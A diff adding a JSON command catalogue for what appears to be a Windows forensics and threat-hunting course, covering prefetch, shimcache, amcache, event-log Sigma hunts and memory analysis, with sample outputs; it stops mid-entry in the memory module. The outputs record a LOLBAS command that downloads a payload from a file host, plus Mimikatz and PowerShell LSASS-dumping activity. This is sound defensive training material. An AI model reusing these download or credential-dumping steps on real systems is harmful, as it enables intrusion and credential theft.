@@ -1,0 +1,1379 @@
+{
+ "module-01-prefetch-pecmd": [
+  {
+   "n": 1,
+   "cmd": "cd module-01-prefetch-pecmd/data        # contains prefetch/*.pf  and  pf.csv",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "PECmd.exe -f prefetch/AM_DELTA.EXE-78CA83B0.pf",
+   "doc": "Source file: prefetch\\AM_DELTA.EXE-78CA83B0.pf\n  Source created:  ...\n  Source modified: ...\n\n  Executable name: AM_DELTA.EXE\n  Hash: 78CA83B0\n  Version: Windows 10 or Windows 11\n\n  Run count: 1\n  Last run: 2020-09-18 22:44:32\n\n  Volume information:\n  #0: Name: \\VOLUME{...}  Serial: ...  Created: ...\n\n  Directories referenced: ...\n\n  Files referenced: 13\n  00: \\VOLUME{...}\\WINDOWS\\SOFTWAREDISTRIBUTION\\DOWNLOAD\\INSTALL\\AM_DELTA.EXE\n  ...\n"
+  },
+  {
+   "n": 3,
+   "cmd": "PECmd.exe -d prefetch --csv . --csvf prefetch.csv",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "awk -F',' 'NR>1 {printf \"%-28s runs=%-3s last=%s loaded=%s files\\n\", $2, $3, $4, $6}' pf.csv",
+   "doc": "AM_DELTA.EXE                 runs=1   last=2020-09-18 22:44:32 loaded=13 files\nAPPLICATIONFRAMEHOST.EXE     runs=7   last=2020-09-19 01:07:38 loaded=77 files\nAUDIODG.EXE                  runs=8   last=2020-09-19 05:18:45 loaded=79 files\n...\nCOREUPDATER.EXE              runs=1   last=2020-09-19 03:40:49 loaded=51 files\n...\n"
+  },
+  {
+   "n": 5,
+   "cmd": "tail -n +2 pf.csv | sort -t, -k4 | awk -F',' '{printf \"%-26s %-40s runs=%-3s\\n\", $4, $2, $3}' | less -S",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "echo \"===== BENIGN BASELINE: SVCHOST =====\"; PECmd.exe -f prefetch/SVCHOST.EXE-12871F9D.pf | grep -iE \"Executable name|Run count|Last run|referenced\"",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "echo \"===== SUSPECT: COREUPDATER =====\"; PECmd.exe -f prefetch/COREUPDATER.EXE-157C54BB.pf | grep -iE \"Executable name|Run count|Last run|referenced\"",
+   "doc": null
+  }
+ ],
+ "module-02-shimcache-appcompatcache": [
+  {
+   "n": 1,
+   "cmd": "cd module-02-shimcache-appcompatcache/data     # SYSTEM, SYSTEM.LOG1, SYSTEM.LOG2, shimcache.csv",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "AppCompatCacheParser -f SYSTEM --csv . --csvf shimcache.csv",
+   "doc": "Two transaction logs found. Determining primary log...\nAt least one transaction log was applied. Sequence numbers have been updated...\nFound 266 cache entries for Windows10C_11 in ControlSet001\n"
+  },
+  {
+   "n": 3,
+   "cmd": "head -13 shimcache.csv | awk -F, '{printf \"%-3s %-58s %-20s %s\\n\",$2,$3,$4,$5}'",
+   "doc": "CacheEntryPosition Path                                                       LastModifiedTimeUTC  Executed\n0   C:\\Windows\\System32\\WScript.exe                            2019-12-07 09:09:07  No\n1   C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2009.2-0\\MpCmdRun.exe 2020-09-18 22:52:47  No\n2   C:\\Windows\\System32\\PickerHost.exe                         2019-12-07 09:08:21  No\n3   C:\\Windows\\system32\\RAServer.exe                           2019-12-07 09:10:32  No\n4   C:\\Windows\\system32\\AppHostRegistrationVerifier.exe        2019-12-07 09:08:21  No\n5   C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2009.2-0\\NisSrv.exe 2020-09-18 22:52:47  No\n6   C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2009.2-0\\MsMpEng.exe 2020-09-18 22:52:47  No\n7   C:\\Windows\\TEMP\\94A2D383-2409-448F-9E98-6B888EB7D248\\MpSigStub.exe 2020-09-18 22:52:47  No\n"
+  },
+  {
+   "n": 4,
+   "cmd": "grep -iE 'Temp|AppData|ProgramData|Public|PerfLogs' shimcache.csv | awk -F, '{printf \"%-3s %-58s %-20s %s\\n\",$2,$3,$4,$5}'",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "grep -i coreupdater shimcache.csv ; echo \"exit=$? (1 = no match)\"",
+   "doc": null
+  }
+ ],
+ "module-03-amcache-amcacheparser": [
+  {
+   "n": 1,
+   "cmd": "cd module-03-amcache-amcacheparser/data        # Amcache.hve, .LOG1, .LOG2, + parsed CSVs",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "AmcacheParser -f Amcache.hve --csv . --csvf amcache.csv -i",
+   "doc": "Two transaction logs found. Determining primary log...\nAt least one transaction log was applied. Sequence numbers have been updated...\nTotal file entries found: 98\nFound 15 unassociated file entry and 83 program file entries (across 85 program entries)\n"
+  },
+  {
+   "n": 3,
+   "cmd": "awk -F, 'NR>1{printf \"%-22s sha1=%s size=%-8s prod=%s\\n\", $7, $4, $11, $10}'   amcache_UnassociatedFileEntries.csv",
+   "doc": "compattelrunner.exe    sha1=992aaab7...  size=172184   prod=microsoft\u00ae windows\u00ae operating system\ncoreupdater.exe        sha1=fd153c66386ca93ec9993d66a84d6f0d129a3a5c  size=7168  prod=\ncsrss.exe              sha1=69a1dcf6...  size=17592    prod=microsoft\u00ae windows\u00ae operating system\nFTK Imager.exe         sha1=32756b3a...  size=22566752 prod=accessdata\u00ae ftk\u00ae imager\n...\n"
+  },
+  {
+   "n": 4,
+   "cmd": "grep -i coreupdater amcache_UnassociatedFileEntries.csv",
+   "doc": "Unassociated,0006485495bded616c6d407985279849903e0000ffff,2020-09-19 03:40:45,fd153c66386ca93ec9993d66a84d6f0d129a3a5c,False,c:\\windows\\system32\\coreupdater.exe,coreupdater.exe,.exe,2010-04-14 22:06:53,,7168,,,coreupdater.exe|4b283e5048abd88b,pe64_amd64,True,...\n"
+  },
+  {
+   "n": 5,
+   "cmd": "awk -F, 'NR>1 && $4!=\"\" {print $4\"  \"$7}' amcache_UnassociatedFileEntries.csv | sort",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "awk -F, 'NR>1{print $3\" | \"$5}' amcache_ProgramEntries.csv | head",
+   "doc": null
+  }
+ ],
+ "module-04-scaling-appcompatprocessor": [
+  {
+   "n": 1,
+   "cmd": "cd module-04-scaling-appcompatprocessor",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "rm -f acp.db          # load appends to an existing DB - start clean so counts reproduce",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "acp acp.db load data/fleet",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "acp acp.db status",
+   "doc": "DB version: 0.9.1\nTotal hosts: 8\nTotal instances: 8\nTotal entries: 352\n"
+  },
+  {
+   "n": 5,
+   "cmd": "acp acp.db stack FileName",
+   "doc": "Count  What\n1      netdom.exe            <- legit (DC tooling)        \\\n1      repadmin.exe          <- legit (DC replication)     |  the RARE TAIL:\n1      ntdsutil.exe          <- legit (DC AD database)     |  legitimate-rare\n1      dns.exe / dsac.exe / ismserv.exe / srmhost.exe ...  |  AND malicious-rare\n1      sqlservr.exe / SQLCMD.EXE / Ssms.exe  <- legit (SQL)|  share this band --\n1      putty.exe             <- legit-ish                  |  you must triage it\n1      balrog.exe            <- EVIL (DC payload)          |\n1      morgul.dll            <- EVIL (NTDS theft)          |\n1      mordor-update.exe     <- EVIL (fake updater)        |\n1      theonering.exe        <- EVIL (dropper)             |\n1      gollum.exe            <- EVIL (temp stager)        /\n2      dfsrs.exe             <- legit (DC + file server)\n2      nazgul.exe            <- EVIL, on TWO hosts  ... lateral movement\n2      palantir.exe          <- EVIL, on TWO hosts  ... C2 spread ISENGARD -> MINAS-TIRITH\n4      Acrobat.exe\n5      Teams.exe\n8      explorer.exe / svchost.exe / kernel32.dll / msedge.exe / ...  <- the benign WALL\n9      lsass.exe\n"
+  },
+  {
+   "n": 6,
+   "cmd": "acp acp.db search",
+   "doc": "Searching for known bad list: AppCompatSearch.txt (98 search terms)\nSearch hits: 1\n[Staging perf.] MINAS-TIRITH-DC01  2024-09-14 02:09:48  C:\\PerfLogs\\balrog.exe  1340416  True\n"
+  },
+  {
+   "n": 7,
+   "cmd": "acp acp.db search -f \"palantir|nazgul|theonering|gollum|balrog|morgul|mordor-update\"",
+   "doc": "Search hits: 18\nBAG-END-LT01      ... C:\\Users\\frodo.baggins\\Downloads\\theonering.exe\nBAG-END-LT01      ... C:\\Users\\frodo.baggins\\AppData\\Local\\Temp\\gollum.exe\nISENGARD-WS04     ... C:\\ProgramData\\palantir.exe\nISENGARD-WS04     ... C:\\Windows\\Temp\\nazgul.exe\nISENGARD-WS04     ... C:\\Users\\saruman.white\\AppData\\Roaming\\mordor-update.exe\nMINAS-TIRITH-DC01 ... C:\\Windows\\Temp\\palantir.exe / nazgul.exe / NTDS\\morgul.dll / PerfLogs\\balrog.exe\n"
+  },
+  {
+   "n": 8,
+   "cmd": "printf '%s\\n' palantir.exe nazgul.exe theonering.exe gollum.exe balrog.exe morgul.dll mordor-update.exe > evilnames.txt",
+   "doc": null
+  },
+  {
+   "n": 9,
+   "cmd": "acp acp.db filehitcount evilnames.txt",
+   "doc": "FileName      HitCount\npalantir.exe  4\n"
+  },
+  {
+   "n": 10,
+   "cmd": "acp acp.db tcorr palantir.exe",
+   "doc": "Searching for AppCompat temporal correlations on FileName: palantir.exe => [2 hits]\nAppCompat temporal execution correlation candidates for palantir.exe:\nLastModified         FilePath         FileName(*)  Size    ExecFlag  Before  After  Weight  Total_Count\n2024-09-14 02:09:48  C:\\Windows\\Temp  nazgul.exe   151552  True      2       0      11.11   2\n"
+  },
+  {
+   "n": 11,
+   "cmd": "acp acp.db tstack 2024-09-13 2024-09-15",
+   "doc": "FullPath           Hits In  Hits Out  Ratio\nnazgul.exe         2        0         20.000\npalantir.exe       2        0         20.000\nbalrog.exe         1        0         10.000\ngollum.exe         1        0         10.000\nmordor-update.exe  1        0         10.000\nmorgul.dll         1        0         10.000\ntheonering.exe     1        0         10.000\n"
+  },
+  {
+   "n": 12,
+   "cmd": "acp acp.db reconscan",
+   "doc": "Total number of potential recon commands detected: 65\nTotal number of hosts with potential recon activity detected: 8 / 8\n"
+  }
+ ],
+ "module-05-evtx-evtxecmd": [
+  {
+   "n": 1,
+   "cmd": "cd module-05-evtx-evtxecmd/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "EvtxECmd -d . --csv . --csvf events.csv",
+   "doc": "Processing sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx...\nRecord # 1 (Event Record Id: 305352): In map for event 1, Property ...ParentUser not found! Replacing with empty string\n...\nTotal event log records found: 3\nProcessing powershell_4104_scriptblock.evtx...\nTotal event log records found: 2\nProcessing bits_lolbas_desktopimgdownldr_59_60.evtx...\nTotal event log records found: 5\nProcessing security_4624_4625_logon_baseline.evtx...\nTotal event log records found: 4\nProcessed 4 files in 0.49 seconds\n"
+  },
+  {
+   "n": 3,
+   "cmd": "head -1 events.csv",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "EvtxECmd -f sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx --csv . --csvf sysmon.csv",
+   "doc": "EventId 1  Process creation  @ 2020-07-03 08:47:20   Computer: MSEDGEWIN10\n  ExecutableInfo = cmd /c desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr\n  ParentProcess  = C:\\Windows\\System32\\cmd.exe\nEventId 11 FileCreate  @ 2020-07-03 08:47:21\n  TargetFilename = C:\\Users\\IEUser\\AppData\\Local\\Temp\\Personalization\\LockScreenImage\\LockScreenImage_uXQ8IiHL80mkJsKc319JaA.7z\n"
+  },
+  {
+   "n": 5,
+   "cmd": "grep -E ',59,|,60,' events.csv",
+   "doc": "EventId 59  \"BITS transfer has started\"  jobTitle: Download LockScreen Image  URL: https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z\nEventId 60  \"BITS transfer has stopped\"  jobTitle: Download LockScreen Image  URL: https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z\n"
+  },
+  {
+   "n": 6,
+   "cmd": "EvtxECmd -f security_4624_4625_logon_baseline.evtx --csv . --csvf logons.csv",
+   "doc": "EventId 4625  Failed logon       Target: MSEDGEWIN10\\IEUser  LogonType 2  (bad username or password)\nEventId 4624  Successful logon   Target: MSEDGEWIN10\\IEUser  LogonType 2\nEventId 4624  Successful logon   Target: NT AUTHORITY\\SYSTEM LogonType 5\n"
+  },
+  {
+   "n": 7,
+   "cmd": "grep -E ',4104,' events.csv",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "EvtxECmd -d . --json . --jsonf events.json",
+   "doc": null
+  }
+ ],
+ "module-06-sigma-chainsaw-hayabusa": [
+  {
+   "n": 1,
+   "cmd": "cd module-06-sigma-chainsaw-hayabusa/data        # 23 curated .evtx samples",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "hayabusa csv-timeline -f sysmon_privesc_psexec_dwell.evtx -o timeline.csv -w -C",
+   "doc": "Total detection rules: 4,628\nDetection rules enabled after channel filter: 2,280\nEvents with hits / Total events: 8 / 12  (Data reduction: 33.33%)\nTotal | Unique detections: 15 | 8\nTop high alerts:   PsExec Service Child Process Execution (1)\nTop medium alerts: PsExec Tool Execution From Suspicious Locations (2) \u00b7 PsExec Service Execution (1)\nSaved file: timeline.csv\n"
+  },
+  {
+   "n": 3,
+   "cmd": "chainsaw hunt sysmon_privesc_psexec_dwell.evtx   -s /opt/chainsaw/sigma   --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": "[!] Loaded 3383 detection rules (378 not loaded)\n[+] Loaded 1 forensic artefacts (68.0 KiB)\n[+] Group: Sigma\n timestamp            detections                          Event ID  Computer      Event Data\n 2020-12-09 16:52:34  \u2023 PsExec Default Named Pipe         17        MSEDGEWIN10   EventType: CreatePipe\n                      \u2023 PsExec Tool Execution From                                PipeName: \\PSEXESVC\n                        Suspicious Locations - PipeName                           Image: C:\\Users\\Public\\psexecprivesc.exe\n 2020-12-09 16:52:41  \u2023 PsExec Service Execution          1         MSEDGEWIN10   Image: C:\\Windows\\PSEXESVC.exe\n                                                                                  User: NT AUTHORITY\\SYSTEM\n"
+  },
+  {
+   "n": 4,
+   "cmd": "hayabusa csv-timeline -d . -o all-timeline.csv -w -C",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "chainsaw hunt . -s /opt/chainsaw/sigma   --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml   --csv --output chainsaw-out",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "hayabusa csv-timeline -d . -o high.csv -w -C --min-level high",
+   "doc": null
+  }
+ ],
+ "module-07-identity-credential-theft": [
+  {
+   "n": 1,
+   "cmd": "cd module-07-identity-credential-theft/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "chainsaw hunt .   -s /opt/chainsaw/sigma   --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml   --csv --output chainsaw-out",
+   "doc": "File                                          Event  Detection(s)\nsysmon_3_10_Invoke-Mimikatz_hosted_Github     10     Potential Credential Dumping Attempt Via PowerShell\nsysmon_10_mimikatz_sekurlsa_logonpasswords    10     HackTool - Generic Process Access; Uncommon GrantedAccess Flags On LSASS\nsysmon_10_comsvcs_minidump_lsass              1, 10  Process Memory Dump Via Comsvcs.DLL; Uncommon Process Access Rights...\npowershell_4104_minidumpwritedump_lsass       4104   Malicious PowerShell Keywords; PowerShell Get-Process LSASS in ScriptBlock; WinAPI Function Calls Via PowerShell Scripts\nsecurity_4662_dcsync                          4662   Active Directory Replication from Non Machine Account; Mimikatz DC Sync\nsecurity_4624_4625_logon_baseline             \u2014      (no detections)\n"
+  },
+  {
+   "n": 3,
+   "cmd": "chainsaw hunt sysmon_10_mimikatz_sekurlsa_logonpasswords.evtx   -s /opt/chainsaw/sigma   --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": " detections: \u2023 HackTool - Generic Process Access\n             \u2023 Uncommon GrantedAccess Flags On LSASS\n Event ID: 10   Computer: PC04.example.corp\n TargetImage:  C:\\Windows\\system32\\lsass.exe\n GrantedAccess: 0x1010\n SourceImage:  C:\\Users\\IEUser\\Desktop\\mimikatz_trunk\\Win32\\mimikatz.exe\n CallTrace:    ...ntdll.dll+...|KERNELBASE.dll+...|mimikatz.exe+...\n"
+  },
+  {
+   "n": 4,
+   "cmd": "hayabusa logon-summary -f security_4624_4625_logon_baseline.evtx",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "EvtxECmd -f security_4624_4625_logon_baseline.evtx --csv . --csvf logons.csv",
+   "doc": null
+  }
+ ],
+ "module-08-lateral-movement": [
+  {
+   "n": 1,
+   "cmd": "cd module-08-lateral-movement/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "EvtxECmd -d . --csv _out --csvf all_events.csv",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "EvtxECmd -f LM_Remote_Service02_7045.evtx --csv _out --csvf svc.csv",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "EvtxECmd -f LM_Remote_Service01_5145_svcctl.evtx --csv _out --csvf svcctl.csv",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "EvtxECmd -f LM_renamed_psexecsvc_5145.evtx       --csv _out --csvf renamed.csv",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "EvtxECmd -f LM_REMCOM_5145_TargetHost.evtx       --csv _out --csvf remcom.csv",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "EvtxECmd -f LM_5145_Remote_FileCopy.evtx         --csv _out --csvf filecopy.csv",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "chainsaw hunt LM_sysmon_psexec_smb_meterpreter.evtx   -s /opt/chainsaw/sigma   --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": null
+  },
+  {
+   "n": 9,
+   "cmd": "chainsaw hunt LM_DCOM_MSHTA_LethalHTA_Sysmon_3_1.evtx               -s /opt/chainsaw/sigma --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": null
+  },
+  {
+   "n": 10,
+   "cmd": "chainsaw hunt LM_impacket_docmexec_mmc_sysmon_01.evtx               -s /opt/chainsaw/sigma --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": null
+  },
+  {
+   "n": 11,
+   "cmd": "chainsaw hunt LM_sysmon_3_DCOM_ShellBrowserWindow_ShellWindows.evtx -s /opt/chainsaw/sigma --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": null
+  },
+  {
+   "n": 12,
+   "cmd": "EvtxECmd -f LM_dcom_shwnd_shbrwnd_mmc20_failed_traces_system_10016.evtx --csv _out --csvf dcom10016.csv",
+   "doc": null
+  },
+  {
+   "n": 13,
+   "cmd": "chainsaw hunt lm_sysmon_18_remshell_over_namedpipe.evtx -s /opt/chainsaw/sigma --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": null
+  },
+  {
+   "n": 14,
+   "cmd": "EvtxECmd -f LM_add_new_namedpipe_tp_nullsession_registry_turla_like_ttp.evtx --csv _out --csvf nullpipe.csv",
+   "doc": null
+  },
+  {
+   "n": 15,
+   "cmd": "EvtxECmd -f LM_ScheduledTask_ATSVC_target_host.evtx --csv _out --csvf sched.csv",
+   "doc": null
+  },
+  {
+   "n": 16,
+   "cmd": "EvtxECmd -f \"remote task update 4624 4702 same logonid.evtx\" --csv _out --csvf taskupd.csv",
+   "doc": null
+  },
+  {
+   "n": 17,
+   "cmd": "EvtxECmd -f lm_remote_registry_sysmon_1_13_3.evtx --csv _out --csvf remreg.csv",
+   "doc": null
+  },
+  {
+   "n": 18,
+   "cmd": "EvtxECmd -f LM_NewShare_Added_Sysmon_12_13.evtx   --csv _out --csvf newshare.csv",
+   "doc": null
+  },
+  {
+   "n": 19,
+   "cmd": "EvtxECmd -f lateral_movement_startup_3_11.evtx    --csv _out --csvf startup.csv",
+   "doc": null
+  },
+  {
+   "n": 20,
+   "cmd": "EvtxECmd -f dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx        --csv _out --csvf rdp_target.csv",
+   "doc": null
+  },
+  {
+   "n": 21,
+   "cmd": "EvtxECmd -f DFIR_RDP_Client_TimeZone_RdpCoreTs_104_example.evtx   --csv _out --csvf rdp_client.csv",
+   "doc": null
+  },
+  {
+   "n": 22,
+   "cmd": "chainsaw hunt LM_sysmon_3_12_13_1_SharpRDP.evtx           -s /opt/chainsaw/sigma --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": null
+  },
+  {
+   "n": 23,
+   "cmd": "chainsaw hunt LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx  -s /opt/chainsaw/sigma --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": null
+  },
+  {
+   "n": 24,
+   "cmd": "EvtxECmd -f LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx --csv _out --csvf pth_src.csv",
+   "doc": null
+  },
+  {
+   "n": 25,
+   "cmd": "EvtxECmd -f \"ImpersonateUser-via local Pass The Hash Sysmon and Security.evtx\" --csv _out --csvf pth_local.csv",
+   "doc": null
+  }
+ ],
+ "module-09-powershell-tradecraft": [
+  {
+   "n": 1,
+   "cmd": "cd module-09-powershell-tradecraft/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "EvtxECmd -f exec_emotet_ps_4104.evtx                                  --csv _out --csvf emotet.csv",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "EvtxECmd -f phish_windows_credentials_powershell_scriptblockLog_4104.evtx --csv _out --csvf phish.csv",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "EvtxECmd -f Powershell_4104_MiniDumpWriteDump_Lsass.evtx             --csv _out --csvf minidump.csv",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "chainsaw hunt Powershell_4104_MiniDumpWriteDump_Lsass.evtx   -s /opt/chainsaw/sigma   --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": "[+] Group: Sigma\n timestamp            detections                                          Event ID  Computer      Channel\n 2020-06-30 14:24:08  \u2023 Malicious PowerShell Keywords                     4104      MSEDGEWIN10   PowerShell/Operational\n                      \u2023 PowerShell Get-Process LSASS in ScriptBlock\n                      \u2023 Suspicious Process Discovery With Get-Process\n                      \u2023 WinAPI Function Calls Via PowerShell Scripts\n ScriptBlockText: \"function Memory($path) ... $Process = Get-Process lsass ...\n                   $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump'...\n Path: C:\\Users\\Public\\lsass_wer_ps.ps1\n"
+  },
+  {
+   "n": 6,
+   "cmd": "chainsaw hunt babyshark_mimikatz_powershell.evtx -s /opt/chainsaw/sigma --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "chainsaw hunt de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx -s /opt/chainsaw/sigma --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "EvtxECmd -f DE_Powershell_CLM_Disabled_Sysmon_12.evtx        --csv _out --csvf clm.csv",
+   "doc": null
+  },
+  {
+   "n": 9,
+   "cmd": "EvtxECmd -f de_powershell_execpolicy_changed_sysmon_13.evtx  --csv _out --csvf execpol.csv",
+   "doc": null
+  },
+  {
+   "n": 10,
+   "cmd": "EvtxECmd -f RemotePowerShell_MS_Windows-Remote_Management_EventID_169.evtx --csv _out --csvf winrm.csv",
+   "doc": null
+  },
+  {
+   "n": 11,
+   "cmd": "EvtxECmd -f LM_PowershellRemoting_sysmon_1_wsmprovhost.evtx  --csv _out --csvf remoting.csv",
+   "doc": null
+  },
+  {
+   "n": 12,
+   "cmd": "chainsaw hunt LM_sysmon_remote_task_src_powershell.evtx -s /opt/chainsaw/sigma --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml",
+   "doc": null
+  }
+ ],
+ "module-10-sysmon-wef": [
+  {
+   "n": 1,
+   "cmd": "cd module-10-sysmon-wef/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "hayabusa csv-timeline -d . -o timeline.csv -w",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "EvtxECmd -f Sysmon_UACME_45.evtx --csv _out --csvf uacme45.csv",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "EvtxECmd -f Sysmon_UACME_63.evtx --csv _out --csvf uacme63.csv",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "EvtxECmd -f sysmon_10_11_lsass_memdump.evtx --csv _out --csvf lsassdump.csv",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "EvtxECmd -f meterpreter_migrate_to_explorer_sysmon_8.evtx --csv _out --csvf migrate.csv",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "EvtxECmd -f Zerologon_DefaultLogging_Security.evtx --csv _out --csvf zl_default.csv",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "EvtxECmd -f Zerologon_Sysmon.evtx                  --csv _out --csvf zl_sysmon.csv",
+   "doc": null
+  }
+ ],
+ "module-11-capstone": [
+  {
+   "n": 1,
+   "cmd": "cd module-11-capstone/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "wc -l apt29_day1.json",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "python3 apt29_hunt.py summary apt29_day1.json",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "python3 apt29_hunt.py execution apt29_day1.json",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "python3 apt29_hunt.py powershell apt29_day1.json",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "python3 apt29_hunt.py lsass apt29_day1.json",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "python3 apt29_hunt.py dcsync apt29_day1.json",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "python3 apt29_hunt.py wmi apt29_day1.json",
+   "doc": null
+  },
+  {
+   "n": 9,
+   "cmd": "python3 apt29_hunt.py persistence apt29_day1.json",
+   "doc": null
+  },
+  {
+   "n": 10,
+   "cmd": "grep -c '\"EventID\":10' apt29_day1.json",
+   "doc": null
+  }
+ ],
+ "module-12-memory-volatility3": [
+  {
+   "n": 1,
+   "cmd": "cd module-12-memory-volatility3/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "sh get-data.sh        # one-time: downloads Challenge.raw (~1.5 GB). Online host only.",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "vol -q -f Challenge.raw windows.info",
+   "doc": "Kernel Base      0xf80002609000\nDTB              0x187000\nSymbols          ...windows.zip!windows/ntkrnlmp.pdb/3844DBB920174967BE7AA4A2C20430FA-2.json.xz\nIs64Bit          True\nNTBuildLab       7601.17514.amd64fre.win7sp1_rtm.\nSystemTime       2019-08-19 14:41:58+00:00\nNtSystemRoot     C:\\Windows\nKeNumberProcessors  1\n"
+  },
+  {
+   "n": 4,
+   "cmd": "vol -q -f Challenge.raw windows.pslist",
+   "doc": "PID   PPID  ImageFileName    Threads Handles CreateTime (UTC)\n4     0     System           78      495     2019-08-19 14:40:07\n496   384   lsass.exe        7       513     2019-08-19 14:40:11\n1944  1844  explorer.exe     35      894     2019-08-19 14:40:19\n880   1944  cmd.exe          1       21      2019-08-19 14:40:26\n2124  1944  chrome.exe       27      662     2019-08-19 14:40:46\n2080  3060  firefox.exe      59      970     2019-08-19 14:41:08\n3716  1944  WinRAR.exe       7       201     2019-08-19 14:41:43\n4084  1944  DumpIt.exe       5       46      2019-08-19 14:41:55\n"
+  },
+  {
+   "n": 5,
+   "cmd": "vol -q -f Challenge.raw windows.pstree",
+   "doc": "1944  explorer.exe   C:\\Windows\\Explorer.EXE\n* 3716 WinRAR.exe    \"C:\\Program Files\\WinRAR\\WinRAR.exe\" \"C:\\Users\\Jaffa\\Desktop\\pr0t3ct3d\\flag.rar\"\n* 4084 DumpIt.exe    \"C:\\Users\\Jaffa\\Desktop\\DumpIt.exe\"\n* 880  cmd.exe       \"C:\\Windows\\system32\\cmd.exe\"\n"
+  },
+  {
+   "n": 6,
+   "cmd": "vol -q -f Challenge.raw windows.psscan",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "vol -q -r csv -f Challenge.raw windows.pslist | tail -n +2 | cut -d, -f2 | sort -u > seen_list.txt",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "vol -q -r csv -f Challenge.raw windows.psscan | tail -n +2 | cut -d, -f2 | sort -u > seen_scan.txt",
+   "doc": null
+  },
+  {
+   "n": 9,
+   "cmd": "comm -13 seen_list.txt seen_scan.txt     # PIDs in scan but NOT in list",
+   "doc": null
+  },
+  {
+   "n": 10,
+   "cmd": "vol -q -f Challenge.raw windows.cmdline",
